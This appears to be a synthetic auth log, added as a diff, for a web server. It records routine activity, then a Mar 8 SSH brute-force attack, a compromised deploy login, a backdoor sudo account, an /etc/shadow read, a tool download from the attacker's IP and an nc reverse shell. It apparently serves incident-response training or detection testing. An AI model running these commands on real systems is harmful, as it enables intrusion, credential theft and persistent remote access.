@@ -1,0 +1,53 @@
+Mar  7 08:15:01 webserver01 CRON[12345]: pam_unix(cron:session): session opened for user root
+Mar  7 08:30:22 webserver01 sshd[14201]: Accepted publickey for admin from 10.0.1.50 port 52341 ssh2
+Mar  7 08:30:22 webserver01 sshd[14201]: pam_unix(sshd:session): session opened for user admin
+Mar  7 09:00:01 webserver01 CRON[14500]: pam_unix(cron:session): session opened for user root
+Mar  7 09:15:33 webserver01 sshd[14800]: Accepted password for deploy from 10.0.1.100 port 49201 ssh2
+Mar  7 09:15:33 webserver01 sshd[14800]: pam_unix(sshd:session): session opened for user deploy
+Mar  7 09:45:00 webserver01 CRON[15100]: pam_unix(cron:session): session opened for user root
+Mar  7 10:00:01 webserver01 CRON[15200]: pam_unix(cron:session): session opened for user www-data
+Mar  7 10:22:15 webserver01 sshd[15400]: Accepted publickey for admin from 10.0.1.50 port 52890 ssh2
+Mar  7 11:00:01 webserver01 CRON[15600]: pam_unix(cron:session): session opened for user root
+Mar  7 11:30:44 webserver01 sshd[15800]: pam_unix(sshd:session): session closed for user admin
+Mar  7 12:00:01 webserver01 CRON[16000]: pam_unix(cron:session): session opened for user root
+Mar  7 14:00:01 webserver01 CRON[16500]: pam_unix(cron:session): session opened for user root
+Mar  7 15:30:22 webserver01 sshd[16800]: Accepted publickey for admin from 10.0.1.50 port 53100 ssh2
+Mar  7 17:00:01 webserver01 CRON[17100]: pam_unix(cron:session): session opened for user root
+Mar  7 17:30:00 webserver01 sshd[17200]: pam_unix(sshd:session): session closed for user deploy
+Mar  7 18:00:01 webserver01 CRON[17400]: pam_unix(cron:session): session opened for user root
+Mar  8 02:14:33 webserver01 sshd[20100]: Invalid user test from 198.51.100.23 port 44120
+Mar  8 02:14:34 webserver01 sshd[20100]: Failed password for invalid user test from 198.51.100.23 port 44120 ssh2
+Mar  8 02:14:36 webserver01 sshd[20101]: Invalid user admin from 198.51.100.23 port 44121
+Mar  8 02:14:37 webserver01 sshd[20101]: Failed password for invalid user admin from 198.51.100.23 port 44121 ssh2
+Mar  8 02:14:39 webserver01 sshd[20102]: Failed password for root from 198.51.100.23 port 44122 ssh2
+Mar  8 02:14:41 webserver01 sshd[20103]: Failed password for root from 198.51.100.23 port 44123 ssh2
+Mar  8 02:14:43 webserver01 sshd[20104]: Invalid user ubuntu from 198.51.100.23 port 44124
+Mar  8 02:14:44 webserver01 sshd[20104]: Failed password for invalid user ubuntu from 198.51.100.23 port 44124 ssh2
+Mar  8 02:14:46 webserver01 sshd[20105]: Invalid user postgres from 198.51.100.23 port 44125
+Mar  8 02:14:47 webserver01 sshd[20105]: Failed password for invalid user postgres from 198.51.100.23 port 44125 ssh2
+Mar  8 02:14:49 webserver01 sshd[20106]: Failed password for root from 198.51.100.23 port 44126 ssh2
+Mar  8 02:14:51 webserver01 sshd[20107]: Invalid user deploy from 198.51.100.23 port 44127
+Mar  8 02:14:52 webserver01 sshd[20107]: Failed password for invalid user deploy from 198.51.100.23 port 44127 ssh2
+Mar  8 02:14:54 webserver01 sshd[20108]: Invalid user git from 198.51.100.23 port 44128
+Mar  8 02:14:55 webserver01 sshd[20108]: Failed password for invalid user git from 198.51.100.23 port 44128 ssh2
+Mar  8 02:14:57 webserver01 sshd[20109]: Failed password for root from 198.51.100.23 port 44129 ssh2
+Mar  8 02:14:59 webserver01 sshd[20110]: Invalid user jenkins from 198.51.100.23 port 44130
+Mar  8 02:15:00 webserver01 sshd[20110]: Failed password for invalid user jenkins from 198.51.100.23 port 44130 ssh2
+Mar  8 02:15:02 webserver01 sshd[20111]: Invalid user mysql from 198.51.100.23 port 44131
+Mar  8 02:15:03 webserver01 sshd[20111]: Failed password for invalid user mysql from 198.51.100.23 port 44131 ssh2
+Mar  8 02:17:11 webserver01 sshd[20200]: Accepted password for deploy from 198.51.100.23 port 44200 ssh2
+Mar  8 02:17:11 webserver01 sshd[20200]: pam_unix(sshd:session): session opened for user deploy
+Mar  8 02:18:05 webserver01 sudo: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Mar  8 02:19:30 webserver01 useradd[20300]: new user: name=svc_backup
+Mar  8 02:19:45 webserver01 usermod[20301]: add 'svc_backup' to group 'sudo'
+Mar  8 02:20:10 webserver01 passwd[20302]: password changed for svc_backup
+Mar  8 02:22:00 webserver01 sshd[20400]: Accepted password for svc_backup from 198.51.100.23 port 44300 ssh2
+Mar  8 02:22:00 webserver01 sshd[20400]: pam_unix(sshd:session): session opened for user svc_backup
+Mar  8 02:23:15 webserver01 sudo: svc_backup : TTY=pts/3 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  8 02:24:00 webserver01 sudo: svc_backup : TTY=pts/3 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/tools.tar.gz -O /tmp/tools.tar.gz
+Mar  8 02:25:30 webserver01 sudo: svc_backup : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/tar xzf /tmp/tools.tar.gz
+Mar  8 02:26:00 webserver01 sudo: svc_backup : TTY=pts/3 ; PWD=/tmp/tools ; USER=root ; COMMAND=/tmp/tools/nc -e /bin/bash 198.51.100.23 4444
+Mar  8 03:00:01 webserver01 CRON[20500]: pam_unix(cron:session): session opened for user root
+Mar  8 06:00:01 webserver01 CRON[20800]: pam_unix(cron:session): session opened for user root
+Mar  8 08:15:00 webserver01 sshd[21000]: Accepted publickey for admin from 10.0.1.50 port 54100 ssh2
+Mar  8 08:15:00 webserver01 sshd[21000]: pam_unix(sshd:session): session opened for user admin
